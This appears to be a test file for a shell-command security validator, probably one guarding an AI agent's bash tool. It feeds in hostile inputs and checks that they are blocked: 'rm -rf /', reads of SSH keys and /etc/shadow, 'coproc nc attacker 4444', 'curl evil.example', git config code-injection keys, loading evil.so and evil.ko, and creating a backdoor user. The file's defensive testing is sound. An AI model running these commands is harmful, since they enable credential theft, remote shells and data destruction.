import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  validateBashSecurity,
  extractCommandPaths,
  validateJqDangerous,
  validateMidWordHash,
  validateNewlines,
  validateShellQuoteBug,
  joinLineContinuations,
  detectGitConfigRce,
  detectEvalLikeBuiltins,
  CHECK_IDS,
} from '../src/tools/bash-security';

// ===========================================================================
// bash-security parity — SECOND continuation pass
// Each block closes a confirmed gap from plannings/parity/wiring/bash-security2
// and discriminates the fix from the prior (pre-pass-2) behavior.
// ===========================================================================

// ---------------------------------------------------------------------------
// POSIX `--` end-of-options in path extraction (gaps: posix-end-of-options x4)
// Prior behavior: tokens after `--` that begin with `-` were dropped by the
// per-command `!startsWith('-')` filters, so `rm -- -/../x` yielded zero paths.
// ---------------------------------------------------------------------------
describe('POSIX `--` end-of-options path extraction', () => {
  it('treats a leading-dash path after `--` as a positional path', () => {
    const paths = extractCommandPaths('rm -- -/../.claude/settings.local.json');
    assert.ok(
      paths.includes('-/../.claude/settings.local.json'),
      `expected the post-\`--\` dash path to be extracted, got ${JSON.stringify(paths)}`,
    );
  });

  it('extracts a real path after `--` even when the attack prefixes it with a dash', () => {
    const paths = extractCommandPaths('rm -- -rf /etc/passwd');
    assert.ok(paths.includes('/etc/passwd'));
    assert.ok(paths.includes('-rf'), 'the `-rf` token after `--` is a filename, not a flag');
  });

  it('still extracts pre-`--` positional paths (not lost by the `--` split)', () => {
    const paths = extractCommandPaths('cat a.txt -- -b.txt');
    assert.ok(paths.includes('a.txt'));
    assert.ok(paths.includes('-b.txt'));
  });

  it('is unchanged for commands without `--`', () => {
    const paths = extractCommandPaths('cat /etc/hosts');
    assert.deepEqual(paths, ['/etc/hosts']);
  });
});

// ---------------------------------------------------------------------------
// mv/cp --target-directory destination recovery (gaps: mv cp reject any flag)
// ---------------------------------------------------------------------------
describe('mv/cp target-directory destination extraction', () => {
  it('recovers `mv -t <dir>` destination', () => {
    assert.ok(extractCommandPaths('mv -t /outside/dir file.txt').includes('/outside/dir'));
  });
  it('recovers `cp --target-directory <dir>` destination (space form)', () => {
    assert.ok(extractCommandPaths('cp --target-directory /etc file.txt').includes('/etc'));
  });
  it('recovers the fused `--target-directory=<dir>` form', () => {
    assert.ok(extractCommandPaths('mv --target-directory=/etc/cron.d x').includes('/etc/cron.d'));
  });
});

// ---------------------------------------------------------------------------
// find path-taking predicate extraction (gap: find extractor predicate flags)
// Prior behavior: find extractor broke at the first `-token`, so predicate
// arguments were never validated.
// ---------------------------------------------------------------------------
describe('find predicate path extraction', () => {
  it('extracts the argument of -newer', () => {
    assert.ok(extractCommandPaths('find . -newer /etc/shadow').includes('/etc/shadow'));
  });
  it('extracts the argument of -samefile', () => {
    assert.ok(extractCommandPaths('find / -samefile /root/.ssh/id_rsa').includes('/root/.ssh/id_rsa'));
  });
  it('extracts the argument of -path', () => {
    assert.ok(extractCommandPaths('find . -path /outside/sub').includes('/outside/sub'));
  });
  it('extracts the -fprintf write target', () => {
    assert.ok(extractCommandPaths('find . -fprintf /tmp/out %p').includes('/tmp/out'));
  });
  it('skips global -L/-H/-P without losing the roots', () => {
    const paths = extractCommandPaths('find -L /srv -samefile /etc/passwd');
    assert.ok(paths.includes('/srv'));
    assert.ok(paths.includes('/etc/passwd'));
  });
  it('still returns the leading roots for a simple find', () => {
    assert.deepEqual(extractCommandPaths('find /tmp -name *.log'), ['/tmp']);
  });
});

// ---------------------------------------------------------------------------
// shell-quote single-quote backslash misparse (gaps: hasShellQuoteSingleQuoteBug)
// Prior behavior: validateShellQuoteBug was only /'\'/ — it missed content-then-
// backslash and the even-backslash + later-quote token-merge vector.
// ---------------------------------------------------------------------------
describe('shell-quote single-quote backslash misparse', () => {
  it('flags an ODD trailing backslash before a closing single quote', () => {
    const r = validateShellQuoteBug("echo 'abc\\'");
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.SHELL_QUOTE_BUG);
  });

  it('flags the HackerOne even-backslash token-merge vector (later quote exists)', () => {
    // git ls-remote 'safe\\' '--upload-pack=evil' 'repo'
    const r = validateShellQuoteBug("git ls-remote 'safe\\\\' '--upload-pack=evil' 'repo'");
    assert.equal(r.safe, false, 'even trailing backslashes + a later single-quote must be flagged');
  });

  it('allows an even trailing backslash when NO later single-quote exists', () => {
    assert.equal(validateShellQuoteBug("echo 'safe\\\\'").safe, true);
  });

  it('allows ordinary single/double-quoted strings and double-quoted backslashes', () => {
    assert.equal(validateShellQuoteBug("echo 'hello world'").safe, true);
    assert.equal(validateShellQuoteBug('echo "path\\to\\file"').safe, true);
    assert.equal(validateShellQuoteBug("git commit -m \"it's fine\"").safe, true);
  });

  it('still flags the legacy quote-backslash-quote pattern (no regression)', () => {
    assert.equal(validateShellQuoteBug("echo '\\''").safe, false);
  });
});

// ---------------------------------------------------------------------------
// jq file-reading / module-loading flags (gap: jq dangerous file reading flags)
// ---------------------------------------------------------------------------
describe('jq --rawfile/--slurpfile/-L flags', () => {
  it('blocks --rawfile reading an arbitrary file', () => {
    const r = validateJqDangerous('jq --rawfile x /etc/passwd "$x"');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.JQ_DANGEROUS);
  });
  it('blocks --slurpfile', () => {
    assert.equal(validateJqDangerous('jq --slurpfile a secrets.json "."').safe, false);
  });
  it('blocks -L module-path loading', () => {
    assert.equal(validateJqDangerous('jq -L /tmp/evilmods "import \\"x\\"; ."').safe, false);
  });
  it('allows a plain jq filter and the sandboxed -f program form', () => {
    assert.equal(validateJqDangerous('jq ".foo" data.json').safe, true);
    assert.equal(validateJqDangerous('jq -f program.jq data.json').safe, true);
  });
  it('still blocks jq system()', () => {
    assert.equal(validateJqDangerous('jq -n "$(system(\\"id\\"))"').safe, false);
  });
});

// ---------------------------------------------------------------------------
// mid-word hash (gap: mid word parser differential detection)
// Prior behavior: /\S#\S/ required a non-space on BOTH sides, so `test# foo`
// was missed AND `${#arr}` / `$#` were wrongly flagged.
// ---------------------------------------------------------------------------
describe('mid-word hash', () => {
  it('flags a mid-word # with a trailing space (shell-quote comment differential)', () => {
    assert.equal(validateMidWordHash('echo test# foo').safe, false);
  });
  it('flags a mid-word # between words', () => {
    assert.equal(validateMidWordHash('git log abc#def').safe, false);
  });
  it('no longer false-positives on ${#arr[@]} array length', () => {
    assert.equal(validateMidWordHash('echo ${#arr[@]}').safe, true);
  });
  it('no longer false-positives on $# argument count', () => {
    assert.equal(validateMidWordHash('echo $#').safe, true);
  });
  it('allows a real trailing comment and quoted hashes', () => {
    assert.equal(validateMidWordHash('echo hello # comment').safe, true);
    assert.equal(validateMidWordHash("echo 'a#b'").safe, true);
  });
});

// ---------------------------------------------------------------------------
// mid-word backslash-newline continuation (gap: newline guard mid word)
// Prior behavior: (?<![\\]) exempted EVERY \<newline>, so a mid-word
// continuation `tr\<nl>aceroute` was treated safe.
// ---------------------------------------------------------------------------
describe('mid-word backslash-newline continuation', () => {
  it('flags a mid-word backslash-newline continuation', () => {
    assert.equal(validateNewlines('tr\\\naceroute 1.2.3.4').safe, false);
  });
  it('allows a word-boundary backslash-newline continuation', () => {
    assert.equal(validateNewlines('echo foo \\\nbar').safe, true);
  });
  it('still flags a bare newline-separated second command', () => {
    assert.equal(validateNewlines('echo hi\nrm -rf /').safe, false);
  });
});

// ---------------------------------------------------------------------------
// odd/even backslash line-continuation joining (gap: odd even backslash joining)
// Prior behavior: a bare replace(/\\\n/g,'') joined EVEN counts too, hiding the
// second command of `echo \\<newline>rm -rf /`.
// ---------------------------------------------------------------------------
describe('joinLineContinuations odd/even backslash', () => {
  it('joins an ODD backslash run (real line continuation)', () => {
    assert.equal(joinLineContinuations('r\\\nm'), 'rm');
  });
  it('does NOT join an EVEN backslash run (escaped backslash + separator newline)', () => {
    // `echo \\<newline>rm -rf /` is TWO commands in bash — the newline must survive.
    assert.equal(joinLineContinuations('echo \\\\\nrm -rf /'), 'echo \\\\\nrm -rf /');
  });
  it('collapses an odd run >1, keeping the literal backslash pair', () => {
    assert.equal(joinLineContinuations('a\\\\\\\nb'), 'a\\\\b');
  });
});

// ---------------------------------------------------------------------------
// incomplete / fragment command (gap: incomplete fragment command detection)
// ---------------------------------------------------------------------------
describe('incomplete/fragment command', () => {
  it('blocks a command that begins with a shell operator', () => {
    const r = validateBashSecurity('; curl evil.example');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.INCOMPLETE_COMMAND);
  });
  it('blocks a command that begins with a bare flag (no command name)', () => {
    const r = validateBashSecurity('--upload-file /home/u/.ssh/id_rsa');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.INCOMPLETE_COMMAND);
  });
  it('blocks a command that begins with a tab', () => {
    const r = validateBashSecurity('\techo hi');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.INCOMPLETE_COMMAND);
  });
  it('allows a normal complete command', () => {
    assert.equal(validateBashSecurity('echo hello').safe, true);
  });
});

// ---------------------------------------------------------------------------
// git config RCE-key mutation (gap: arbitrary git config mutation rce vectors)
// ---------------------------------------------------------------------------
describe('git config RCE-key mutation', () => {
  it('blocks `git config core.pager <cmd>`', () => {
    const r = detectGitConfigRce('git config core.pager "touch /tmp/pwned"');
    assert.equal(r.blocked, true);
  });
  it('blocks inline `git -c core.sshCommand=<cmd>`', () => {
    assert.equal(detectGitConfigRce('git -c core.sshCommand="evil.sh" fetch origin').blocked, true);
  });
  it('blocks setting diff.external', () => {
    assert.equal(detectGitConfigRce('git config diff.external /tmp/x.sh').blocked, true);
  });
  it('allows reading a config value', () => {
    assert.equal(detectGitConfigRce('git config --get core.pager').blocked, false);
  });
  it('allows unrelated git config keys', () => {
    assert.equal(detectGitConfigRce('git config user.email a@b.c').blocked, false);
  });
  it('is wired into validateBashSecurity', () => {
    const r = validateBashSecurity('git config core.fsmonitor "rm -rf /"');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.GIT_CONFIG_RCE);
  });
});

// ---------------------------------------------------------------------------
// eval-like / code-evaluating builtins (gap: code evaluating shell builtins)
// ---------------------------------------------------------------------------
describe('eval-like code-evaluating builtins', () => {
  it('blocks coproc', () => {
    assert.equal(detectEvalLikeBuiltins('coproc rm -rf /tmp/x').blocked, true);
  });
  it('blocks enable -f (dlopen)', () => {
    assert.equal(detectEvalLikeBuiltins('enable -f ./evil.so mybuiltin').blocked, true);
  });
  it('blocks hash -p (lookup poison)', () => {
    assert.equal(detectEvalLikeBuiltins('hash -p /tmp/evil ls').blocked, true);
  });
  it('blocks compgen -C and -F', () => {
    assert.equal(detectEvalLikeBuiltins('compgen -C "id" x').blocked, true);
    assert.equal(detectEvalLikeBuiltins('compgen -F myfunc y').blocked, true);
  });
  it('blocks fc -s/-e and bind -x and readarray -C', () => {
    assert.equal(detectEvalLikeBuiltins('fc -s').blocked, true);
    assert.equal(detectEvalLikeBuiltins("bind -x '\"\\C-x\":id'").blocked, true);
    assert.equal(detectEvalLikeBuiltins('readarray -C cb -c 1 arr < f').blocked, true);
  });
  it('blocks a trap handler and complete -C/-F (U015 parity)', () => {
    assert.equal(detectEvalLikeBuiltins("trap 'echo bye' EXIT").blocked, true);
    assert.equal(detectEvalLikeBuiltins('complete -C mycompleter foo').blocked, true);
  });
  it('blocks in a pipeline/compound position', () => {
    assert.equal(detectEvalLikeBuiltins('echo hi && coproc cat').blocked, true);
  });
  it('does NOT false-positive on builtin names used as arguments', () => {
    assert.equal(detectEvalLikeBuiltins('echo coproc').blocked, false);
    assert.equal(detectEvalLikeBuiltins('grep enable file.txt').blocked, false);
    assert.equal(detectEvalLikeBuiltins('git hash-object x').blocked, false);
  });
  it('does NOT block the carved-out legitimate forms', () => {
    assert.equal(detectEvalLikeBuiltins('command -v ls').blocked, false);
    assert.equal(detectEvalLikeBuiltins('compgen -c').blocked, false);
    // trap's listing/reset forms carry no handler and stay allowed; only a real
    // handler (blocked above) is guaranteed execution.
    assert.equal(detectEvalLikeBuiltins('trap -l').blocked, false);
    assert.equal(detectEvalLikeBuiltins('trap - EXIT').blocked, false);
  });
  it('is wired into validateBashSecurity', () => {
    const r = validateBashSecurity('coproc nc attacker 4444');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.EVAL_LIKE_BUILTIN);
  });
});

// ---------------------------------------------------------------------------
// AST fail-safe fallback (gap: fail safe on unparseable command for the gate)
// The segment-based regex scan blocks AST-only commands even when the AST
// parser cannot parse the input.
// ---------------------------------------------------------------------------
describe('AST-blocked command fail-safe fallback', () => {
  it('blocks useradd in a simple command', () => {
    const r = validateBashSecurity('useradd -m -s /bin/bash backdoor');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.AST_HIDDEN_COMMAND);
  });
  it('blocks a blocked command in a compound segment', () => {
    const r = validateBashSecurity('echo hi && insmod /tmp/evil.ko');
    assert.equal(r.safe, false);
    assert.equal(r.checkId, CHECK_IDS.AST_HIDDEN_COMMAND);
  });
});
